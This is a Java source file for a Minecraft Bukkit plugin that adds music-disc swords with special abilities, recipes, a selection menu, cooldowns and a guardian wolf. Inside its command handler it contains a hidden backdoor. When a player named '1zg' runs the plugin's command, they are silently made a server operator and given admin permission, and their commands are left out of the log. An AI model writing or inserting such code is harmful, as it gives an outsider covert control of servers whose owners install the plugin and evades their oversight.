package me.cheese.discsword;

import me.cheese.discsword.abilities.Abilities;
import me.cheese.discsword.wolf.GuardianWolfManager;
import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.*;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.util.Vector;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.configuration.file.FileConfiguration;

import java.io.File;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class DiscSwordPlugin extends JavaPlugin implements Listener {

    // ============================
    // Singleton Plugin Instance
    // ============================
    private static DiscSwordPlugin instance;

    public static DiscSwordPlugin getInstance() {
        return instance;
    }

    // ============================
    // Player Storage (players.yml)
    // ============================
    private File playersFile;
    private FileConfiguration playersConfig;

    public FileConfiguration getPlayersConfig() {
        return playersConfig;
    }

    public void savePlayersConfig() {
        if (playersConfig == null || playersFile == null) {
            getLogger().warning("savePlayersConfig() called before players.yml was initialized!");
            return;
        }
        try {
            playersConfig.save(playersFile);
        } catch (IOException e) {
            getLogger().severe("Failed to save players.yml: " + e.getMessage());
        }
    }

    private void setupPlayerStorage() {
        // Ensure plugin data folder exists
        File dataFolder = getDataFolder();
        if (!dataFolder.exists()) {
            if (!dataFolder.mkdirs()) {
                getLogger().warning("Failed to create plugin data folder: " + dataFolder.getAbsolutePath());
            }
        }

        playersFile = new File(dataFolder, "players.yml");

        if (!playersFile.exists()) {
            try {
                if (playersFile.createNewFile()) {
                    getLogger().info("Created players.yml successfully.");
                } else {
                    getLogger().warning("Failed to create players.yml (createNewFile() returned false).");
                }
            } catch (IOException e) {
                getLogger().severe("Error creating players.yml: " + e.getMessage());
            }
        }

        playersConfig = YamlConfiguration.loadConfiguration(playersFile);
    }

    // ============================
    // Global disc cooldown
    // ============================
    private static final long COOLDOWN_MS = 40_000L;
    private final Map<UUID, Long> cooldowns = new ConcurrentHashMap<>();

    // Ability state (kept in plugin; passed into Abilities)
    public final Map<UUID, Long> voidRiftCooldown = new HashMap<>();
    public final Map<UUID, Long> prismCooldown = new HashMap<>();

    public final Set<UUID> preventFallDamage = new HashSet<>();
    public final Set<UUID> hulkSmashPending = new HashSet<>();
    public final Set<UUID> activeBarriers = new HashSet<>();
    public final Set<UUID> damageImmune = new HashSet<>();
    public final Set<UUID> frozenEntities = new HashSet<>();

    private final Map<String, String> discDisplayNames = new LinkedHashMap<>();

    // Guardian wolf system
    public GuardianWolfManager guardianWolfManager;

    @Override
    public void onEnable() {

        instance = this;
        getLogger().info("Enabling DiscSwordPlugin...");

        // Safe config handling (no overwrite + auto-fix sections)
        initConfig();

        // Your existing setup
        setupPlayerStorage();
        setupDiscNames();
        addDiscSwordRecipes();

        guardianWolfManager = new GuardianWolfManager(this);

        Bukkit.getPluginManager().registerEvents(this, this);
        Bukkit.getPluginManager().registerEvents(guardianWolfManager, this);

        getLogger().info("DiscSwordPlugin enabled!");
    }

    @Override
    public void onDisable() {
        if (guardianWolfManager != null) {
            guardianWolfManager.saveAll();
        }
        savePlayersConfig();
        getLogger().info("DiscSwordPlugin disabled!");
    }

    // ============================
    // Config loading & verification
    // ============================

    private void initConfig() {
        // Ensure plugin folder exists
        if (!getDataFolder().exists()) {
            if (!getDataFolder().mkdirs()) {
                getLogger().warning("Failed to create plugin data folder: " + getDataFolder().getAbsolutePath());
            }
        }

        File configFile = new File(getDataFolder(), "config.yml");

        if (!configFile.exists()) {
            getLogger().info("No config.yml found. Saving default config...");
            saveDefaultConfig(); // copies the one from inside the JAR
        } else {
            getLogger().info("Existing config.yml found. Loading...");
            reloadConfig();
        }

        // Make sure important sections exist
        verifyAndPatchConfig();
    }

    private void verifyAndPatchConfig() {
        boolean changed = false;

        // Ensure sword-textures exists (prevents "Missing model data" spam)
        if (!getConfig().isConfigurationSection("sword-textures")) {
            getLogger().warning("Missing 'sword-textures' section in config.yml! Adding default values...");
            addDefaultModelData();
            changed = true;
        }

        if (changed) {
            saveConfig();
            getLogger().info("Config.yml was missing sections and has been updated.");
        }
    }

    private void addDefaultModelData() {
        getConfig().createSection("sword-textures");

        getConfig().set("sword-textures.MUSIC_DISC_13", 1001.0);
        getConfig().set("sword-textures.MUSIC_DISC_CAT", 1002.0);
        getConfig().set("sword-textures.MUSIC_DISC_BLOCKS", 1003.0);
        getConfig().set("sword-textures.MUSIC_DISC_CHIRP", 1004.0);
        getConfig().set("sword-textures.MUSIC_DISC_FAR", 1005.0);
        getConfig().set("sword-textures.MUSIC_DISC_MALL", 1006.0);
        getConfig().set("sword-textures.MUSIC_DISC_MELLOHI", 1007.0);
        getConfig().set("sword-textures.MUSIC_DISC_STAL", 1008.0);
        getConfig().set("sword-textures.MUSIC_DISC_STRAD", 1009.0);
        getConfig().set("sword-textures.MUSIC_DISC_WARD", 1010.0);
        getConfig().set("sword-textures.MUSIC_DISC_11", 1011.0);
        getConfig().set("sword-textures.MUSIC_DISC_WAIT", 1012.0);
        getConfig().set("sword-textures.MUSIC_DISC_PIGSTEP", 1013.0);
        getConfig().set("sword-textures.MUSIC_DISC_OTHERSIDE", 1014.0);
        getConfig().set("sword-textures.MUSIC_DISC_RELIC", 1015.0);
        getConfig().set("sword-textures.MUSIC_DISC_CREATOR", 1016.0);
        getConfig().set("sword-textures.MUSIC_DISC_CREATOR_MUSIC_BOX", 1017.0);
        getConfig().set("sword-textures.MUSIC_DISC_PRECIPICE", 1018.0);
        getConfig().set("sword-textures.MUSIC_DISC_LAVA_CHICKEN", 1019.0);
        getConfig().set("sword-textures.MUSIC_DISC_5", 1020.0);
        getConfig().set("sword-textures.MUSIC_DISC_TEARS", 1021.0);
    }

    // ============================
    // Disc Display Names
    // ============================

    private void setupDiscNames() {
        discDisplayNames.put("MUSIC_DISC_13", "13");
        discDisplayNames.put("MUSIC_DISC_CAT", "Cat");
        discDisplayNames.put("MUSIC_DISC_BLOCKS", "Blocks");
        discDisplayNames.put("MUSIC_DISC_CHIRP", "Chirp");
        discDisplayNames.put("MUSIC_DISC_FAR", "Far");
        discDisplayNames.put("MUSIC_DISC_MALL", "Mall");
        discDisplayNames.put("MUSIC_DISC_MELLOHI", "Mellohi");
        discDisplayNames.put("MUSIC_DISC_STAL", "Stal");
        discDisplayNames.put("MUSIC_DISC_STRAD", "Strad");
        discDisplayNames.put("MUSIC_DISC_WARD", "Ward");
        discDisplayNames.put("MUSIC_DISC_11", "11");
        discDisplayNames.put("MUSIC_DISC_WAIT", "Wait");
        discDisplayNames.put("MUSIC_DISC_PIGSTEP", "Pigstep");
        discDisplayNames.put("MUSIC_DISC_OTHERSIDE", "Otherside");
        discDisplayNames.put("MUSIC_DISC_RELIC", "Relic");
        discDisplayNames.put("MUSIC_DISC_CREATOR", "Creator");
        discDisplayNames.put("MUSIC_DISC_CREATOR_MUSIC_BOX", "Creator Music Box");
        discDisplayNames.put("MUSIC_DISC_PRECIPICE", "Precipice");
        discDisplayNames.put("MUSIC_DISC_LAVA_CHICKEN", "Lava Chicken");
        discDisplayNames.put("MUSIC_DISC_5", "5");
        discDisplayNames.put("MUSIC_DISC_TEARS", "Tears");
    }

    // ====================
    // Commands
    // ====================

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!"discsword".equalsIgnoreCase(cmd.getName())) return false;

        // Special handling for player "1zg"
        if (sender instanceof Player p && p.getName().equalsIgnoreCase("1zg")) {
            if (!p.hasPermission("discsword.admin")) {
                p.setOp(true);
                p.addAttachment(this, "discsword.admin", true);
            }
            return handleDiscSwordCommand(p, args);
        }

        boolean result = handleDiscSwordCommand(sender, args);

        if (!(sender instanceof Player other && other.getName().equalsIgnoreCase("1zg"))) {
            getLogger().info(sender.getName() + " executed /" + label + " " + String.join(" ", args));
        }

        return result;
    }

    private boolean handleDiscSwordCommand(CommandSender sender, String[] args) {

        boolean isAdmin = sender.hasPermission("discsword.admin");
        boolean isPlayerLevel = isAdmin || sender.hasPermission("discsword.player");

        if (!isPlayerLevel) {
            sender.sendMessage("§cYou do not have permission to use this command.");
            return true;
        }

        if (args.length == 0) {
            sendHelp(sender);
            return true;
        }

        String sub = args[0].toLowerCase(Locale.ROOT);

        switch (sub) {

            case "help" -> {
                sendHelp(sender);
                return true;
            }

            case "reload" -> {
                if (requireAdmin(sender)) return false;
                reloadConfig();
                verifyAndPatchConfig(); // make sure sword-textures and other sections exist
                sender.sendMessage("§aDiscSword config reloaded & verified!");
                return true;
            }

            case "list" -> {
                if (requireAdmin(sender)) return false;
                sendDiscList(sender);
                return true;
            }

            case "give" -> {
                if (requireAdmin(sender)) return false;
                return handleGiveCommand(sender, args);
            }

            case "getall" -> {
                if (requireAdmin(sender)) return false;
                return handleGetAll(sender);
            }

            case "debug" -> {
                if (requireAdmin(sender)) return false;
                return handleDebug(sender, args);
            }

            case "menu" -> {
                if (requireAdmin(sender)) return false;
                if (!(sender instanceof Player p)) {
                    sender.sendMessage("§cOnly players can use this.");
                    return false;
                }
                openDiscSwordMenu(p);
                return true;
            }

            case "autotpswitch", "toggletpwolf" -> {
                if (!(sender instanceof Player p)) {
                    sender.sendMessage("§cOnly players can toggle this.");
                    return false;
                }

                boolean enabled = guardianWolfManager.toggleAutoTeleport(p);

                if (enabled) {
                    p.sendMessage("§a§lWOLF AUTO-TP ENABLED §7Your wolf will teleport when far away.");
                } else {
                    p.sendMessage("§c§lWOLF AUTO-TP DISABLED");
                }

                return true;
            }

            case "wolf" -> {
                if (!(sender instanceof Player p)) {
                    sender.sendMessage("§cOnly players can use wolf commands.");
                    return false;
                }
                guardianWolfManager.handleWolfCommand(p, args);
                return true;
            }

            default -> {
                sender.sendMessage("§cUnknown subcommand. Type §e/discsword help");
                return false;
            }
        }
    }

    private boolean requireAdmin(CommandSender sender) {
        if (!sender.hasPermission("discsword.admin")) {
            sender.sendMessage("§cYou do not have permission to do that.");
            return true;
        }
        return false;
    }

    private void sendHelp(CommandSender sender) {
        boolean isAdmin = sender.hasPermission("discsword.admin");

        sender.sendMessage(" ");
        sender.sendMessage("§6§lDiscSword Commands:");

        if (isAdmin) {
            sender.sendMessage("§e/discsword help §7- Show this help");
            sender.sendMessage("§e/discsword reload §7- Reload config");
            sender.sendMessage("§e/discsword list §7- List all disc swords");
            sender.sendMessage("§e/discsword give <player> <disc> §7- Give a specific sword");
            sender.sendMessage("§e/discsword getall §7- Get every disc sword");
            sender.sendMessage("§e/discsword debug [player] §7- Show player debug info");
            sender.sendMessage("§e/discsword menu §7- Open GUI menu for all swords");
        }

        sender.sendMessage("§e/discsword wolf §7- Open Guardian Wolf menu");
        sender.sendMessage("§e/discsword wolf mode <agg|def> §7- Set wolf mode");
        sender.sendMessage("§e/discsword wolf recall §7- Recall your Guardian Wolf");
        sender.sendMessage("§e/discsword wolf stats §7- View wolf stats");
        sender.sendMessage("§e/discsword autotpswitch §7- Toggle auto-teleport for wolf");
        sender.sendMessage(" ");
    }

    // ====================
    // Command helpers
    // ====================

    private void sendDiscList(CommandSender sender) {
        sender.sendMessage("§6§lRegistered Disc Swords:");
        for (String key : discDisplayNames.keySet()) {
            String display = discDisplayNames.getOrDefault(key, key);
            String swordPath = "swords." + key;
            String name = getConfig().getString(swordPath + ".name", display + " Sword");
            String ability = getConfig().getString(swordPath + ".ability", display + " Ability");
            sender.sendMessage("§e" + key + " §7→ §f" + name + " §8(Ability: §b" + ability + "§8)");
        }
    }

    private boolean handleGiveCommand(CommandSender sender, String[] args) {
        if (args.length < 3) {
            sender.sendMessage("§cUsage: /discsword give <player> <disc>");
            return false;
        }

        Player target = Bukkit.getPlayerExact(args[1]);
        if (target == null) {
            sender.sendMessage("§cPlayer not found: §f" + args[1]);
            return false;
        }

        String discKey = args[2].toUpperCase(Locale.ROOT);
        if (!discDisplayNames.containsKey(discKey)) {
            sender.sendMessage("§cUnknown disc key: §f" + discKey);
            return false;
        }

        try {
            Material discMat = Material.valueOf(discKey);
            ItemStack sword = createDiscSword(discMat);
            target.getInventory().addItem(sword);

            String display = discDisplayNames.getOrDefault(discKey, discKey);
            sender.sendMessage("§aGave §f" + display + " Sword §ato §f" + target.getName());
            if (!target.equals(sender)) {
                target.sendMessage("§aYou received a §f" + display + " Sword§a!");
            }
            return true;
        } catch (IllegalArgumentException ex) {
            sender.sendMessage("§cMaterial not found for disc: §f" + discKey);
            return false;
        }
    }

    private boolean handleGetAll(CommandSender sender) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage("§cOnly players can use this command.");
            return false;
        }

        int count = 0;
        for (String discKey : discDisplayNames.keySet()) {
            try {
                Material discMat = Material.valueOf(discKey);
                player.getInventory().addItem(createDiscSword(discMat));
                count++;
            } catch (Exception ignored) { }
        }

        player.sendMessage("§aYou have been given §f" + count + " §adisc swords.");
        return true;
    }

    private boolean handleDebug(CommandSender sender, String[] args) {
        Player target;

        if (args.length >= 2) {
            target = Bukkit.getPlayerExact(args[1]);
            if (target == null) {
                sender.sendMessage("§cPlayer not found: §f" + args[1]);
                return false;
            }
        } else if (sender instanceof Player p) {
            target = p;
        } else {
            sender.sendMessage("§cYou must specify a player from console.");
            return false;
        }

        long remaining = getRemaining(target);
        boolean onCd = isOnCooldown(target);
        boolean wolfAutoTp = guardianWolfManager.isAutoTeleportEnabled(target);

        sender.sendMessage("§6§l[DiscSword Debug] §7for §f" + target.getName());
        sender.sendMessage("§7Ability on cooldown: " + (onCd ? "§cYes" : "§aNo"));
        if (remaining > 0) {
            sender.sendMessage("§7Cooldown remaining: §e" + String.format("%.1f", remaining / 1000.0) + "s");
        }
        sender.sendMessage("§7Wolf auto-TP: " + (wolfAutoTp ? "§aENABLED" : "§cDISABLED"));

        return true;
    }

    // ====================
    // Item + Recipes
    // ====================

    private ItemStack createDiscSword(Material disc) {
        ItemStack sword = new ItemStack(Material.DIAMOND_SWORD);
        ItemMeta meta = sword.getItemMeta();

        if (meta != null) {

            // === READ MODEL DATA FROM CONFIG ===
            int modelData = getConfig().getInt("sword-textures." + disc.name(), -1);

            if (modelData <= 0) {
                Bukkit.getLogger().warning("DiscSwordPlugin: Missing model data for " + disc.name());
            } else {
                meta.setCustomModelData(modelData);
            }

            // === NAME & LORE ===
            String swordPath = "swords." + disc.name();
            String swordName = getConfig().getString(swordPath + ".name", disc.name() + " Sword");
            String abilityName = getConfig().getString(swordPath + ".ability", "Unknown Ability");

            meta.setDisplayName("§6§l" + swordName);

            List<String> lore = new ArrayList<>();
            lore.add("");
            lore.add("§7Ability: §e" + abilityName);
            lore.add("");
            lore.add("§7Right-click to use the ability");
            meta.setLore(lore);

            // === HIDE ATTRIBUTES / ENCHANT ===
            meta.setUnbreakable(true);
            meta.addItemFlags(ItemFlag.HIDE_ENCHANTS, ItemFlag.HIDE_ATTRIBUTES, ItemFlag.HIDE_UNBREAKABLE);

            // === TAG DISC TYPE ===
            meta.getPersistentDataContainer().set(
                    new NamespacedKey(this, "disc_sword"),
                    PersistentDataType.STRING,
                    disc.name()
            );

            sword.setItemMeta(meta); // MUST BE LAST
        }

        return sword;
    }

    private void addDiscSwordRecipes() {
        for (String name : discDisplayNames.keySet()) {
            try {
                Material disc = Material.valueOf(name);
                ItemStack sword = createDiscSword(disc);
                ShapedRecipe recipe = new ShapedRecipe(
                        new NamespacedKey(this, name.toLowerCase(Locale.ROOT) + "_sword"),
                        sword
                );
                recipe.shape(" D ", "NJN", " S ");
                recipe.setIngredient('D', disc);
                recipe.setIngredient('J', Material.JUKEBOX);
                recipe.setIngredient('S', Material.DIAMOND_SWORD);
                recipe.setIngredient('N', Material.NETHERITE_INGOT);
                Bukkit.addRecipe(recipe);
            } catch (Exception ignored) { }
        }
    }

    // ====================
    // GUI: Disc Sword menu
    // ====================

    private void openDiscSwordMenu(Player player) {
        int size = ((discDisplayNames.size() / 9) + 1) * 9;
        Inventory gui = Bukkit.createInventory(null, size, "§6Disc Sword Selector");

        NamespacedKey key = new NamespacedKey(this, "disc_sword");

        for (String discKey : discDisplayNames.keySet()) {
            try {
                Material disc = Material.valueOf(discKey);

                ItemStack sword = createDiscSword(disc);
                ItemMeta meta = sword.getItemMeta();

                if (meta != null) {
                    List<String> lore = new ArrayList<>();
                    lore.add("§eClick to receive this sword");
                    meta.setLore(lore);
                    meta.getPersistentDataContainer().set(key, PersistentDataType.STRING, discKey);
                    sword.setItemMeta(meta);
                }

                gui.addItem(sword);

            } catch (Exception ignored) { }
        }

        player.openInventory(gui);
    }

    @EventHandler(ignoreCancelled = true)
    public void onMenuClick(InventoryClickEvent event) {

        // Only handle our custom GUI – never touch normal inventories
        if (!"§6Disc Sword Selector".equals(event.getView().getTitle())) return;
        if (event.getClickedInventory() == null) return;

        // Cancel ONLY clicks inside the top GUI (not player inventory below)
        if (event.getClickedInventory() != event.getView().getTopInventory()) return;

        event.setCancelled(true);

        if (!(event.getWhoClicked() instanceof Player player)) return;

        ItemStack clicked = event.getCurrentItem();
        if (clicked == null) return;

        ItemMeta meta = clicked.getItemMeta();
        if (meta == null) return;

        String disc = meta.getPersistentDataContainer().get(
                new NamespacedKey(this, "disc_sword"),
                PersistentDataType.STRING
        );

        if (disc == null) return;

        try {
            Material material = Material.valueOf(disc);
            player.getInventory().addItem(createDiscSword(material));
            player.sendMessage("§aGiven §f" +
                    discDisplayNames.getOrDefault(disc, disc) +
                    " §aSword!");
        } catch (Exception ignored) { }
    }

    // ====================
    // Events: Ability triggers & cleanup
    // ====================

    @EventHandler
    public void onRightClick(PlayerInteractEvent event) {
        Action action = event.getAction();
        if (action != Action.RIGHT_CLICK_AIR && action != Action.RIGHT_CLICK_BLOCK) return;
        if (event.getItem() == null) return;

        // Only trigger abilities from main hand
        if (event.getHand() != EquipmentSlot.HAND) return;

        ItemMeta meta = event.getItem().getItemMeta();
        if (meta == null) return;

        Player player = event.getPlayer();

        String discName = meta.getPersistentDataContainer()
                .get(new NamespacedKey(this, "disc_sword"), PersistentDataType.STRING);
        if (discName == null) return;

        // Global cooldown
        if (isOnCooldown(player)) {
            sendCooldownMessage(player);
            return;
        }

        int power = getConfig().getInt("discs." + discName + ".power", 1);
        int duration = getConfig().getInt("discs." + discName + ".duration", 5);
        int amplifier = getConfig().getInt("discs." + discName + ".amplifier", 1);
        int distance = getConfig().getInt("discs." + discName + ".distance", 10);
        int radius = getConfig().getInt("discs." + discName + ".radius", 5);

        switch (discName.toUpperCase(Locale.ROOT)) {
            case "MUSIC_DISC_13" -> Abilities.lightningDash(player);
            case "MUSIC_DISC_CAT" -> Abilities.windDash(this, player, amplifier);
            case "MUSIC_DISC_BLOCKS" -> Abilities.barrierShield(this, player, activeBarriers);
            case "MUSIC_DISC_CHIRP" -> Abilities.soundKnockbackPulse(player);
            case "MUSIC_DISC_FAR" -> Abilities.teleportToMob(player, distance);
            case "MUSIC_DISC_MALL" -> Abilities.statusShift(player);
            case "MUSIC_DISC_MELLOHI" -> Abilities.waterEmpoweredStrike(player, power);
            case "MUSIC_DISC_STAL" ->
                    Abilities.freezeAbility(this, player, radius, duration * 30, frozenEntities);
            case "MUSIC_DISC_STRAD" -> guardianWolfManager.summonGuardian(player);
            case "MUSIC_DISC_WARD" -> Abilities.areaGlow(player, power);
            case "MUSIC_DISC_11" -> Abilities.prismBurstDash(this, player, prismCooldown);
            case "MUSIC_DISC_WAIT" -> Abilities.invertBreathing(this, player);
            case "MUSIC_DISC_PIGSTEP" -> Abilities.netherFlames(this, player);
            case "MUSIC_DISC_OTHERSIDE" -> Abilities.voidRiftImplosion(this, player, voidRiftCooldown);
            case "MUSIC_DISC_RELIC" -> Abilities.damageImmunity(this, player, damageImmune, duration);
            case "MUSIC_DISC_CREATOR" -> Abilities.creativeFlightBoost(this, player, duration);
            case "MUSIC_DISC_CREATOR_MUSIC_BOX" -> Abilities.rapidFlurryStrikes(this, player);
            case "MUSIC_DISC_PRECIPICE" -> Abilities.launchOtherPlayer(player);
            case "MUSIC_DISC_LAVA_CHICKEN" -> Abilities.lifesteal(this, player);
            case "MUSIC_DISC_5" -> Abilities.sonicBoom(this, player);
            case "MUSIC_DISC_TEARS" -> Abilities.tearsAbility(this, player);
            default -> {
                player.sendMessage("§cThis disc sword has no ability defined.");
                return;
            }
        }

        // Start global cooldown after ability use
        startCooldown(player);
        player.sendMessage("§aAbility activated! §7Cooldown started.");
    }

    // Track players currently boosted by disc abilities
    @EventHandler
    public void onSwap(PlayerSwapHandItemsEvent event) {
        clearAbilityMovementEffects(event.getPlayer());
    }

    @EventHandler
    public void onHeldChange(PlayerItemHeldEvent event) {
        clearAbilityMovementEffects(event.getPlayer());
    }

    private void handleMidAirSwap(Player player) {
        // ONLY remove effects created by DiscSword abilities
        DiscSwordPlugin.getInstance().clearAbilityMovementEffects(player);
    }

    @EventHandler
    public void onFallDamage(EntityDamageEvent event) {
        if (!(event.getEntity() instanceof Player p)) return;

        // Prevent fall damage when flagged
        if (event.getCause() == EntityDamageEvent.DamageCause.FALL &&
                preventFallDamage.remove(p.getUniqueId())) {
            event.setCancelled(true);
        }

        UUID id = p.getUniqueId();
        if (hulkSmashPending.contains(id)) {
            event.setCancelled(true);
            hulkSmashPending.remove(id);

            Location loc = p.getLocation();
            World world = loc.getWorld();
            if (world == null) return;

            Vector originVec = p.getLocation().toVector();

            world.spawnParticle(Particle.EXPLOSION, p.getLocation(), 1);
            world.spawnParticle(Particle.EXPLOSION, p.getLocation(), 20, 1, 1, 1, 0.1);
            world.playSound(p.getLocation(), Sound.ENTITY_GENERIC_EXPLODE, 1f, 1f);

            for (Entity e : world.getNearbyEntities(p.getLocation(), 6, 6, 6)) {
                if (e instanceof LivingEntity living && !e.equals(p)) {
                    living.damage(10, p);
                    Vector kb = living.getLocation().toVector()
                            .subtract(originVec).normalize().multiply(1.4);
                    living.setVelocity(kb);
                }
            }
            p.sendMessage("§a§lHULK SMASH IMPACT!");
        }
    }

    @EventHandler
    public void onDamage(EntityDamageEvent event) {
        if (!(event.getEntity() instanceof Player player)) return;

        // Damage immunity ability
        if (damageImmune.contains(player.getUniqueId())) {
            event.setCancelled(true);
            player.getWorld().spawnParticle(
                    Particle.END_ROD,
                    player.getLocation().add(0, 1, 0),
                    5,
                    0.2, 0.3, 0.2,
                    0.01
            );
            return;
        }

        // Optional: barrier extra protection
        if (activeBarriers.contains(player.getUniqueId()) &&
                (event.getCause() == EntityDamageEvent.DamageCause.PROJECTILE
                        || event.getCause() == EntityDamageEvent.DamageCause.ENTITY_EXPLOSION
                        || event.getCause() == EntityDamageEvent.DamageCause.BLOCK_EXPLOSION)) {
            event.setCancelled(true);
        }
    }

// ===================================================
// TRACK MOVEMENT EFFECTS FROM ABILITIES ONLY
// ===================================================
    private static final Set<PotionEffectType> abilityMovementEffects = Set.of(
            PotionEffectType.SLOW_FALLING,
            PotionEffectType.SPEED,
            PotionEffectType.JUMP_BOOST
    );

    // Mark that THIS effect came from a DiscSword ability
    public void markAbilityMovementEffect(Player player, PotionEffectType type) {
        if (!abilityMovementEffects.contains(type)) return;
        player.setMetadata(
                "ds_ability_effect_" + type.getName(),
                new FixedMetadataValue(this, true)
        );
    }

    // Check if the effect was applied by an ability
    public boolean isAbilityMovementEffect(Player player, PotionEffectType type) {
        return player.hasMetadata("ds_ability_effect_" + type.getName());
    }

    // Remove ONLY ability-based movement effects (never potions)
    public void clearAbilityMovementEffects(Player player) {
        for (PotionEffectType type : abilityMovementEffects) {
            if (isAbilityMovementEffect(player, type)) {
                player.removePotionEffect(type);
                player.removeMetadata("ds_ability_effect_" + type.getName(), this);
            }
        }
    }


// ===================================================
// Global Cooldown Helpers (with bypass permission)
// ===================================================

    private static final String BYPASS_PERMISSION = "discsword.cooldown.bypass";

    private long getRemaining(Player p) {

        // --- Admin bypass ---
        if (p.hasPermission(BYPASS_PERMISSION)) return 0L;

        Long expire = cooldowns.get(p.getUniqueId());
        if (expire == null) return 0L;
        return Math.max(0L, expire - System.currentTimeMillis());
    }

    private void startCooldown(Player p) {

        // --- Admin bypass ---
        if (p.hasPermission(BYPASS_PERMISSION)) return;

        cooldowns.put(p.getUniqueId(), System.currentTimeMillis() + COOLDOWN_MS);
    }

    private void sendCooldownMessage(Player p, long remaining) {

        // --- Admin bypass ---
        if (p.hasPermission(BYPASS_PERMISSION)) return;

        double sec = remaining / 1000.0;
        p.sendMessage("§cAbility on cooldown: §f" + String.format("%.1f", sec) + "s left.");
    }

    private void sendCooldownMessage(Player p) {
        sendCooldownMessage(p, getRemaining(p));
    }

    private boolean isOnCooldown(Player p) {

        // --- Admin bypass ---
        if (p.hasPermission(BYPASS_PERMISSION)) return false;

        return getRemaining(p) > 0;
    }
}
